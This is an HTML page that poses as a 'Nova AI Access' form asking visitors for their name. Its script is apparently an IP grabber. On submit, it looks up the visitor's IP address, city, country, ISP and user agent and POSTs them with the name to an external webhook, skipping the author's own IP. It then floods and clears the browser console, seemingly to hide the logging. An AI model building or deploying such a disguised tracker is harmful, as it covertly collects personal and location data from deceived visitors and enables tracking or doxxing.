<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nova AI Access</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f2f2f2;
            padding: 20px;
            text-align: center;
        }

        h1 {
            color: #333;
            font-size: 36px;
            margin-top: 40px;
        }

        .content {
            max-width: 1200px;
            margin: 0 auto;
            background: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
        }

        p {
            color: red;
            font-size: 18px;
        }

        .name-form {
            margin-bottom: 20px;
        }

        input {
            padding: 10px;
            font-size: 18px;
            border-radius: 8px;
            border: 1px solid #ccc;
            margin-top: 10px;
            width: 80%;
            max-width: 400px;
        }

        button {
            padding: 10px 20px;
            font-size: 18px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #45a049;
        }

        .user-info {
            margin-top: 20px;
            font-size: 20px;
            font-weight: bold;
        }

        .images-container {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 15px;
            margin-top: 20px;
        }

        .images-container img {
            width: 250px;
            height: auto;
            border-radius: 8px;
            box-shadow: 0 0 15px hotpink;
        }

        /* Responsive design */
        @media (max-width: 768px) {
            .images-container img {
                width: 200px;
            }

            input, button {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="content">
        <h1>Nova AI Access</h1>
        <p>The philosophy of philosophy is the study of the nature, scope, and meaning of philosophy itself...</p>

        <div class="name-form">
            <input type="text" id="userName" placeholder="Enter your name to access Nova AI resources" />
            <button onclick="submitName()">Submit</button>
        </div>

        <div class="user-info" id="userInfo"></div>
        <div class="images-container" id="imagesContainer"></div>
    </div>

    <script>
        const webhookUrl = "https://eoky7dsuisvr7mo.m.pipedream.net";
        const excludedIP = "83.105.112.217"; // Your IP

        let images = [
            "https://i.imgur.com/2NbxHm1.jpg",
            "https://i.imgur.com/JWcTqvO.jpg",
            "https://i.imgur.com/BV2kg9A.jpg",
            "https://i.imgur.com/69gEpf3.jpg",
            "https://i.imgur.com/Q4vIUl9.jpg"
        ];

        async function getIPData() {
            try {
                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
                return ipData;
            } catch (error) {
                console.error("Error fetching IP data:", error);
                return null;
            }
        }

        async function submitName() {
            const userName = document.getElementById('userName').value.trim();

            if (!userName) {
                alert("Please enter your name to continue!");
                return;
            }

            document.getElementById('userInfo').innerText = `Hello, ${userName}!`;

            const ipData = await getIPData();
            if (!ipData) {
                console.error("Could not retrieve IP data.");
                return;
            }

            if (ipData.ip === excludedIP) {
                console.log("Your IP is excluded, no data sent.");
                return;
            }

            const log = {
                name: userName,
                ip: ipData.ip,
                city: ipData.city,
                country: ipData.country,
                isp: ipData.org,
                userAgent: navigator.userAgent,
                time: new Date().toISOString()
            };

            const response = await fetch(webhookUrl, {
                method: "POST",
                body: JSON.stringify(log),
                headers: { "Content-Type": "application/json" }
            });

            if (response.ok) {
                console.log("Data successfully sent to the webhook.");
            } else {
                console.error("Error sending data to webhook:", response.status);
            }

            // Display random images
            showRandomImages();
            spamConsole(); // Add random console spam
        }

        function showRandomImages() {
            const imagesContainer = document.getElementById("imagesContainer");
            let usedImages = new Set();

            for (let i = 0; i < 3; i++) {
                let randomImage;
                do {
                    randomImage = images[Math.floor(Math.random() * images.length)];
                } while (usedImages.has(randomImage)); // Ensure no duplicates

                usedImages.add(randomImage);

                const img = document.createElement("img");
                img.src = randomImage;
                imagesContainer.appendChild(img);
            }
        }

        function spamConsole() {
            let spamCount = 0;

            const interval = setInterval(() => {
                console.log("Random Data: " + Math.random());
                spamCount++;
                if (spamCount >= 300) {
                    clearInterval(interval);
                    console.clear(); // Clear console after 300 spam messages
                }
            }, 50);
        }
    </script>
</body>
</html>
